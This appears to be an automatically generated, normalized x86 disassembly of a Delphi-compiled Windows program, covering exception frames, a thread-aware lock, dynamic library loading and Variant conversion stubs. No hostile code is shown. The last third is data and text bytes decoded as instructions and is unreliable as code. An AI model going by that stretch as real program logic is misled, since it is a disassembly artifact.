jmp r-xdata
inc esi
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 + 0x4 ]
lea edx [ esi + esi * 2 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov [ edx + ecx * 4 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x18 ]
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
lea edi [ esi + esi * 2 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 + 0x4 ] 0x0
je r-xdata
sub_3a6e8e4
push esi
push ebx
mov esi eax
xor eax eax
pop ebx
pop esi
retn
cmp bl 0x41
jl r-xdata
xor al bl
inc esi
jmp r-xdata
cmp bl 0x5a
jg r-xdata
rol eax 0x5
mov bl [ esi ]
cmp bl 0x0
je r-xdata
or bl 0x20
sub_3a6ea38
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a6eac3
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_3a6cae0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6eaca
lea eax [ ebp - 0x14 ]
call sub_3a652a0
retn
sub_3a6eae0
push ebx
push esi
mov bl 0x1
mov esi [ rw-data ]
jmp r-xdata
test bl bl
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
test esi esi
jne r-xdata
call [ esi + 0x4 ]
mov ebx eax
mov esi [ esi ]
sub_3a6eb00
push ebx
push esi
mov esi rw-data
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ebx [ esi ]
mov eax [ ebx ]
mov [ esi ] eax
mov edx 0x8
mov eax ebx
call sub_3a62efc
pop esi
pop ebx
retn
sub_3a6eb24
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_3a6a0a0
mov [ rw-data ] eax
sub_3a6eba8
push ebx
push esi
push edi
push ebp
push ecx
call sub_3a6478c
mov [ esp ] dl
mov ebp eax
xor edi edi
inc edi
cmp edi 0x10
jne r-xdata
mov esi ebx
mov ebx [ ebx ]
mov eax esi
call sub_3a62efc
test ebx ebx
jne r-xdata
mov ebx [ ebp + edi * 4 + 0x4 ]
xor eax eax
mov [ ebp + edi * 4 + 0x4 ] eax
test ebx ebx
je r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebp
call sub_3a64370
cmp [ esp ] 0x0
jle r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a64734
sub_3a6ec1c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_3a6ec00
mov ebx eax
call GetCurrentThreadId
mov esi eax
movzx eax bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_3a6eca4
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_3a62ec8
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
movzx eax bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_3a6eb98
mov [ ebp ] eax
sub_3a6eca4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3a6ec00
movzx eax al
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_3a6eb98
mov esi eax
cmp esi 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_3a6ece8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a6ed5c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3a6ede8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_3a64380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a6ede8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
mov bl 0x1
call GetCurrentThreadId
mov edi eax
cmp edi [ ebp + 0x24 ]
je r-xdata
inc [ ebp + 0x1c ]
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a6eda4
mov eax [ ebp + 0x28 ]
mov [ esp + 0x4 ] eax
mov edx esp
mov eax [ ebp + 0x20 ]
call sub_3a6ec1c
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff0001
call sub_3a6eba0
cmp eax 0xffff
jne r-xdata
lea eax [ ebp + 0xc ]
call sub_3a6eb80
jmp r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff
call sub_3a6eba0
mov esi eax
test esi esi
je r-xdata
mov eax ebp
call sub_3a6eda4
test bl bl
je r-xdata
mov eax ebp
call sub_3a6edd8
mov [ ebp + 0x24 ] edi
lea eax [ ebp + 0x28 ]
call sub_3a6eb80
dec eax
cmp eax [ esp + 0x4 ]
sete bl
lea eax [ ebp + 0xc ]
call sub_3a6eb8c
sub_3a6ee94
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_3a6ec1c
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_3a6eba0
mov eax ebx
call sub_3a6edbc
mov eax ebx
call sub_3a6edb0
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_3a6ec94
sub_3a6eee4
push ebx
push esi
push edi
push ecx
mov edi eax
mov edx esp
mov eax [ edi + 0x20 ]
call sub_3a6ec1c
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ edi + 0x24 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_3a6edc8
jmp r-xdata
lea eax [ edi + 0xc ]
call sub_3a6eb8c
test eax eax
jle r-xdata
lea eax [ edi + 0xc ]
call sub_3a6eb80
mov esi eax
cmp esi 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax edi
call sub_3a6edc8
mov eax edi
call sub_3a6edbc
sub_3a6ef54
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_3a6ec1c
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_3a6ec94
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_3a6eb80
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_3a6edbc
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_3a6edbc
sub_3a6efcc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_3a6eff0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a6f067
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_3a64434
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f06e
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a64434
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3a6efcc
test al al
jne r-xdata
mov al 0x1
sub_3a6f088
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a6f0fa
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_3a6f0dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a65730
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f0e3
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_3a6f10c
push ebx
mov ebx [ rw-data ]
mov ebx [ ebx ]
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov edx [ r-xdata ]
mov eax [ ebx + 0x14 ]
call sub_3a66170
xor eax eax
mov [ ebx + 0x14 ] eax
sub_3a6f401
mov eax 0x175403af
mov al 0x3
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a6f590
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f597
retn
mov eax rw-data
call sub_3a6efbc
mov eax r-xdata
call sub_3a66b74
call sub_3a6f10c
call sub_3a6eb00
call sub_3a6da98
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a65a7c
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
mov edx [ r-xdata ]
call sub_3a665dc
mov eax rw-data
mov edx [ r-xdata ]
call sub_3a665dc
mov eax rw-data
call sub_3a652a0
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_3a65e38
sub_3a6f5bc
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
movzx eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_3a6f610
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_3a6f66a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_3a65528
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_3a69a2c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f671
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6f67c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_3a6f6d6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_3a65528
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_3a6b040
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f6dd
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6f6e8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_3a6f742
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_3a65528
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_3a6b014
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f749
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6f754
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_3a6f7ae
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_3a65528
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_3a6ca44
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f7b5
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6f7c0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_3a6f81a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_3a65528
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_3a6b06c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f821
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6f82c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a6f899
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_3a65528
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_3a69b80
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f8a0
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
sub_3a6f8ac
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_3a6f90c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_3a6afc8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_3a65bdc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f913
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6f91c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_3a6f97e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_3a6c124
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_3a65bdc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f985
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6f990
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_3a6f9f4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_3a69c1c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_3a65bdc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f9fb
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6fa24
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_3a6fa50
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_3a6f5bc
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5ec
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5ec
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5f8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5f8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5f8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5f8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5f8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5f8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5f8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5f8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f5f8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f604
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f610
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f67c
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f6e8
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f754
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f7c0
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f82c
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f8ac
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f91c
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_3a6f990
mov eax r-xdata
call sub_3a6fa24
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_3a6fd5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a6fd81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6fd88
retn
sub_3a6feac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_3a6ff13
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] bl
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
ror [ esi - 0x59ba37fd ] 0x1
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add [ edi + 0xc03 ] ah
add al dl
mov [ esi - 0x59ba37fd ] fs
inc ebp
jb r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] al
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
ror [ esi - 0x59ba37fd ] 0x1
outsd
jb r-xdata
adc eax 0x72615645
jns r-xdata
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ edi ]
outsb
popad
outsb
je r-xdata
sar [ edi + edi * 8 + 0x3a6 ] 0x0
add [ eax ] al
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ 0x72615645 ]
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x1
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
ror [ esi - 0x59ba37fd ] 0x1
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
add [ edi + 0xc03 ] esp
add al dl
mov [ esi - 0x59ba37fd ] fs
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
outsd
jb r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
fadd [ ebp - 0x5a ]
inc ebp
push esi
popad
jb r-xdata
add [ edi + 0x3 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0xc03a7 ] al
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
inc ebp
jb r-xdata
add ebx [ eax ]
jb r-xdata
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
jb r-xdata
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
jb r-xdata
outsb
je r-xdata
popad
ror [ ecx + eax - 0x59 ] 0x3
add [ eax ] al
inc ebp
push esi
popad
jb r-xdata
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ 0x72615645 ]
add [ edi + 0x3 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
add [ edi + 0xc03 ] ah
jbe r-xdata
popad
outsb
je r-xdata
and [ eax ] al
inc ebx
popad
jae r-xdata
popad
jb r-xdata
pop eax
jmp [ esi + 0x3 ]
add al dl
mov [ esi - 0x59ba37fd ] fs
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
